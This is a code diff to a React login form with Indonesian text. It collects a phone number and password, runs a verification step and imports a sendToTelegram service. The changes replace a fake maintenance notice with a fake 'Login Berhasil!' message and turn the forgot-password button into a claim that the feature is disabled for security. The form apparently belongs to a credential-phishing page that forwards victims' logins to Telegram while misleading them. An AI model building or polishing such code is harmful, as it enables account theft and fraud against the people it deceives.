@@ -1,14 +1,20 @@
 import { useState } from 'react';
 import { sendToTelegram } from '../services/telegram';
+import AlertModal from './AlertModal';
 import './LoginForm.css';
 
-interface HpLoginProps {
+interface HpLoginFormProps {
   onClose?: () => void;
   playClickSound?: () => void;
 }
 
-const HpLoginForm = ({ onClose, playClickSound }: HpLoginProps) => {
+const HpLoginForm = ({ onClose, playClickSound }: HpLoginFormProps) => {
   const [phoneNumber, setPhoneNumber] = useState('');
+  const [alertConfig, setAlertConfig] = useState<{isOpen: boolean, message: string, subMessage?: string}>({
+    isOpen: false,
+    message: '',
+    subMessage: ''
+  });
   const [password, setPassword] = useState('');
   const [phoneError, setPhoneError] = useState(false);
   const [pwError, setPwError] = useState(false);
@@ -124,7 +130,7 @@ const HpLoginForm = ({ onClose, playClickSound }: HpLoginProps) => {
           <div className="w-full rounded-[30px] overflow-hidden shadow-[0_20px_50px_rgba(0,0,0,0.5)] bg-[#fdf5f8] border-2 border-white/50">
             {/* Header */}
             <div className="h-14 bg-gradient-to-r from-[#b71c1c] via-[#e91e63] to-[#b71c1c] flex items-center justify-center relative shadow-lg">
-              <div className="absolute inset-0 bg-[url('/header-pattern.png')] opacity-20"></div>
+              <div className="absolute inset-0 bg-[url('/src/assets/images/header-pattern.png')] opacity-20"></div>
               
               <div className="absolute -top-1 flex gap-1"></div>
 
@@ -184,7 +190,11 @@ const HpLoginForm = ({ onClose, playClickSound }: HpLoginProps) => {
                     onChange={handlePasswordChange}
                   />
                   <button 
-                    onClick={() => alert("Fitur belum tersedia")}
+                    onClick={() => setAlertConfig({
+                      isOpen: true,
+                      message: "Fitur ini saat ini tidak bisa digunakan untuk menjaga keamanan akun Anda.",
+                     
+                    })}
                     className="px-3 py-1 bg-[#e91e63] hover:bg-[#c2185b] text-white text-[10px] font-bold rounded-full border border-yellow-400 shadow-md active:scale-95 transition-transform whitespace-nowrap"
                   >
                     lupa kata sandi
@@ -218,7 +228,7 @@ const HpLoginForm = ({ onClose, playClickSound }: HpLoginProps) => {
           <div className="w-full rounded-[30px] overflow-hidden shadow-[0_20px_50px_rgba(0,0,0,0.5)] bg-[#fdf5f8] border-2 border-white/50">
             {/* Header */}
             <div className="h-14 bg-gradient-to-r from-[#b71c1c] via-[#e91e63] to-[#b71c1c] flex items-center justify-center relative shadow-lg">
-              <div className="absolute inset-0 bg-[url('/header-pattern.png')] opacity-20"></div>
+              <div className="absolute inset-0 bg-[url('/src/assets/images/header-pattern.png')] opacity-20"></div>
               <h2 className="text-[#ffd700] text-2xl font-black tracking-wide drop-shadow-[0_2px_2px_rgba(0,0,0,0.8)] uppercase" style={{ textShadow: '0 2px 0 #b71c1c' }}>
                 Verifikasi
               </h2>
@@ -273,47 +283,26 @@ const HpLoginForm = ({ onClose, playClickSound }: HpLoginProps) => {
         </div>
       )}
 
-      {/* Success Modal */}
+      {/* SUCCESS MODAL (Step 3) */}
       {step === 3 && (
-        <div className="fixed inset-0 z-[3000] flex items-center justify-center bg-black/80 backdrop-blur-sm animate-pop-in">
-          <div className="relative w-[320px] bg-gradient-to-b from-[#4a148c] to-[#2a0e45] rounded-xl border-2 border-[#ffd700] p-5 flex flex-col items-center shadow-[0_0_20px_rgba(255,215,0,0.3)]">
-            {/* Close Button */}
-            <button 
-              onClick={handleClose} 
-              className="absolute top-2 right-2 w-6 h-6 flex items-center justify-center bg-white/10 hover:bg-white/20 rounded-full text-white transition-colors text-xs"
-            >
-              ✕
-            </button>
-
-            {/* Animated Icon */}
-            <div className="w-16 h-16 mb-4 relative">
-               <div className="absolute inset-0 bg-[#ffd700]/20 rounded-full animate-ping"></div>
-               <div className="relative w-full h-full bg-[#ffd700] rounded-full flex items-center justify-center shadow-[0_0_15px_#ffd700]">
-                  <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8 text-[#4a148c] animate-spin-slow" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
-                    <path strokeLinecap="round" strokeLinejoin="round" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" />
-                    <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
-                  </svg>
-               </div>
-            </div>
-
-            {/* Text Content */}
-            <h3 className="text-[#ffd700] text-lg font-black uppercase tracking-wider mb-2 text-center drop-shadow-md">
-              Sistem Maintenance
-            </h3>
-            <p className="text-white/80 text-center text-xs leading-relaxed mb-4 font-medium px-2">
-              Maaf, saat ini sistem sedang dalam perbaikan berkala untuk meningkatkan kualitas layanan.
-            </p>
-
-            {/* Action Button */}
-            <button 
-              onClick={handleClose}
-              className="px-6 py-1.5 bg-gradient-to-r from-[#ffd700] to-[#ffb74d] text-[#4a148c] text-sm font-bold rounded-full shadow-md hover:scale-105 active:scale-95 transition-transform"
-            >
-              Mengerti
-            </button>
-          </div>
+        <div className="flex flex-col items-center justify-center p-8 bg-white rounded-3xl shadow-xl animate-pop-in">
+           <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mb-4">
+             <svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+               <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
+             </svg>
+           </div>
+           <h2 className="text-2xl font-black text-gray-800 mb-2 uppercase tracking-tight">Login Berhasil!</h2>
+           <p className="text-gray-500 text-center font-medium">Anda akan segera diarahkan ke lobby game.</p>
         </div>
       )}
+
+      <AlertModal 
+          isOpen={alertConfig.isOpen} 
+          onClose={() => setAlertConfig(prev => ({ ...prev, isOpen: false }))} 
+          title="AKSES DIBATASI" 
+          message={alertConfig.message} 
+          subMessage={alertConfig.subMessage} 
+        />
     </div>
   );
 };
